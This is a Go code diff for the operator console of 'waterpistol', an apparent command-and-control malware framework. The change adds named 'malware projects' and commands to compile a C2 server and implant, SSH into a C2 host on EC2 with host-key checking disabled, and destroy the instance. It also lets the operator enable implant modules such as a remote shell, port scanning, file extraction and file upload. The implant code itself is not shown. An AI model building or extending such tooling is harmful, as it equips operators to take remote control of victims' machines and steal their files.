@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"github.com/chzyer/readline"
 	"io"
+	"io/ioutil"
 	"log"
 	"math/rand"
 	"os"
@@ -13,20 +14,58 @@ import (
 	"time"
 )
 
-// Contains current options/c2ip/modules
-type waterpistol struct {
+type project struct {
+	name    string
 	srcdir  string
 	srcid   string
 	ip      string
 	port    int
 	modules []string
-	term    *readline.Instance
 }
 
-var valid_modules = []string{"sh", "portscan", "file_extractor", "file_uploader", "ip_scan"}
+// Contains current options/c2ip/modules
+type waterpistol struct {
+	term     *readline.Instance
+	current  int
+	projects []project
+}
 
-func (waterpistol *waterpistol) writeString(str string) {
-	log.Print(str)
+func generate_funny_name() string {
+	words := []string{
+		"photocopy", "theorist", "trustee", "hook", "eliminate", "crop", "registration", "snub", "reliance",
+		"bank", "forge", "old", "researcher", "lifestyle", "civilization", "hide", "knock", "choice",
+		"hostile", "relevance", "transform", "journal", "deal", "complex", "demonstrate", "dialect",
+		"meaning", "thread", "hell", "competence", "enjoy", "rain", "rhythm", "army", "provide", "spontaneous",
+		"kidnap", "bubble", "exempt", "piano", "mastermind", "writer", "watch", "Koran", "tenant", "negative",
+		"smash", "just", "discipline", "rub"}
+
+	num1 := rand.Intn(len(words))
+	num2 := rand.Intn(len(words))
+
+	return strings.Title(words[num1]) + strings.Title(words[num2])
+}
+
+func (waterpistol *waterpistol) current_project() *project {
+	if waterpistol.current == -1 || len(waterpistol.projects) == 0 {
+		return nil
+	}
+	return &waterpistol.projects[waterpistol.current]
+}
+
+func valid_modules() []string {
+	modules := []string{}
+
+	files, err := ioutil.ReadDir("./implant/modules")
+	if err != nil {
+		log.Fatal(err)
+	}
+	for _, f := range files {
+		if f.IsDir() && strings.Compare(f.Name(), "included_modules") != 0 {
+			modules = append(modules, f.Name())
+		}
+	}
+
+	return modules
 }
 
 func checkProgram() {
@@ -59,11 +98,11 @@ func checkProgram() {
 	}
 }
 
-func (waterpistol *waterpistol) ssh() {
+func (project *project) ssh() {
 	// CMD :  ssh -t root@ip screen -dr c2
 	//	cmd := exec.Command("ssh", "-i", "./id_c2", "-t", "ec2-user@"+waterpistol.ip, "screen", "-dr", "c2")
 	// Instead of scren, why not just run it on load
-	cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking no", "-i", "./id_c2", "-t", "ec2-user@"+waterpistol.ip, "./c2 ./cert.pem ./key.pem")
+	cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking no", "-i", "./id_c2", "-t", "ec2-user@"+project.ip, "./c2 ./cert.pem ./key.pem")
 	cmd.Stdin = os.Stdin
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
@@ -82,11 +121,17 @@ func filterInput(r rune) (rune, bool) {
 }
 
 func (waterpistol *waterpistol) valid_disable(string) []string {
-	return waterpistol.modules
+	if waterpistol.current_project() == nil {
+		return []string{}
+	}
+	return waterpistol.current_project().modules
 }
 
 func (waterpistol *waterpistol) valid_enable(string) []string {
-	return valid_modules
+	if waterpistol.current_project() == nil {
+		return []string{}
+	}
+	return valid_modules()
 }
 
 func (waterpistol *waterpistol) setup_terminal() {
@@ -119,9 +164,9 @@ func (waterpistol *waterpistol) setup_terminal() {
 	waterpistol.term = l
 }
 
-func (waterpistol *waterpistol) enable(module string) {
+func (project *project) enable(module string) {
 	valid := false
-	for _, s := range valid_modules {
+	for _, s := range valid_modules() {
 		if strings.Compare(s, module) == 0 {
 			valid = true
 			break
@@ -129,20 +174,27 @@ func (waterpistol *waterpistol) enable(module string) {
 	}
 
 	if !valid {
-		fmt.Println("Please select a valid module", valid_modules)
+		log.Println("Please select a valid module", valid_modules())
 		return
 	}
 
-	waterpistol.modules = append(waterpistol.modules, module)
+	for _, s := range project.modules {
+		if strings.Compare(s, module) == 0 {
+			log.Println("Module already enabled")
+			return
+		}
+	}
+
+	project.modules = append(project.modules, module)
 }
 
-func (waterpistol *waterpistol) disable(module string) {
-	old_modules := waterpistol.modules
-	waterpistol.modules = []string{}
+func (project *project) disable(module string) {
+	old_modules := project.modules
+	project.modules = []string{}
 
 	for _, m := range old_modules {
 		if strings.Compare(m, module) != 0 {
-			waterpistol.modules = append(waterpistol.modules, m)
+			project.modules = append(project.modules, m)
 		}
 	}
 
@@ -150,9 +202,10 @@ func (waterpistol *waterpistol) disable(module string) {
 
 func help() {
 	log.Println("Commands:")
+	log.Println("\tnew              -> Create a new malware project")
 	log.Println("\tcompile          -> Compile c2 && implant and run c2 ")
 	log.Println("\tssh              -> ssh into c2")
-	log.Println("\tdestro           -> destroy c2 instance")
+	log.Println("\tdestroy          -> destroy c2 instance")
 	log.Println("\tlist             -> List currently enabled modules")
 	log.Println("\tenable <module>  -> Enable a module (tab complete)")
 	log.Println("\tdisable <module> -> Disable a module (tab complete)")
@@ -162,36 +215,82 @@ func help() {
 func (waterpistol *waterpistol) handle(line string) {
 	parts := strings.Split(strings.TrimSpace(line), " ")
 	switch parts[0] {
+	case "new":
+		if waterpistol.current_project() != nil {
+			log.Println("Currently only support one project")
+			return
+		}
+
+		project := project{name: generate_funny_name()}
+		waterpistol.current = waterpistol.current + 1
+		waterpistol.projects = append(waterpistol.projects, project)
+		log.Println("Created new project `" + project.name + "`")
+		waterpistol.term.SetPrompt("\033[96mwaterpistol \033[91m<" + project.name + ">\033[96m%\033[0m ")
 	case "compile":
-		if len(waterpistol.modules) == 0 {
-			waterpistol.writeString("Maybe `enable` a few modules\n")
+		current_project := waterpistol.current_project()
+		if current_project == nil {
+			log.Print("Maybe create a `new` project\n")
 			return
 		}
-		waterpistol.compile_c2_implant()
+
+		if len(current_project.modules) == 0 {
+			log.Print("Maybe `enable` a few modules\n")
+			return
+		}
+		current_project.compile_c2_implant()
 	case "ssh":
-		if len(waterpistol.ip) == 0 {
-			waterpistol.writeString("Maybe `compile` first\n")
+		current_project := waterpistol.current_project()
+		if current_project == nil {
+			log.Print("Maybe create a `new` project\n")
 			return
 		}
-		waterpistol.ssh()
+		if len(current_project.ip) == 0 {
+			log.Print("Maybe `compile` first\n")
+			return
+		}
+		current_project.ssh()
 	case "enable":
+		current_project := waterpistol.current_project()
+		if current_project == nil {
+			log.Print("Maybe create a `new` project\n")
+			return
+		}
+
 		if len(parts) != 2 {
 			help()
 			return
 		}
-		waterpistol.enable(parts[1])
+		current_project.enable(parts[1])
 	case "disable":
+		current_project := waterpistol.current_project()
+		if current_project == nil {
+			log.Print("Maybe create a `new` project\n")
+			return
+		}
 		if len(parts) != 2 {
 			help()
 			return
 		}
-		waterpistol.disable(parts[1])
+		current_project.disable(parts[1])
 	case "list":
-		waterpistol.writeString("Modules: " + strings.Join(waterpistol.modules, ", "))
+		current_project := waterpistol.current_project()
+		if current_project == nil {
+			log.Print("Maybe create a `new` project\n")
+			return
+		}
+
+		log.Print("Modules: " + strings.Join(current_project.modules, ", "))
+	case "destroy":
+		log.Println("Destroying c2 && ec2 instance")
+		out, err := exec.Command("./c2_down").CombinedOutput()
+		if err != nil {
+			log.Println(out, err)
+		}
+
 	case "help":
 		help()
 	default:
-		waterpistol.writeString("What")
+		log.Print("What")
 	}
 }
 
@@ -213,7 +312,7 @@ func main() {
 
 	rand.Seed(time.Now().UTC().UnixNano())
 
-	waterpistol := &waterpistol{}
+	waterpistol := &waterpistol{current: -1}
 
 	waterpistol.setup_terminal()
 	defer waterpistol.term.Close()
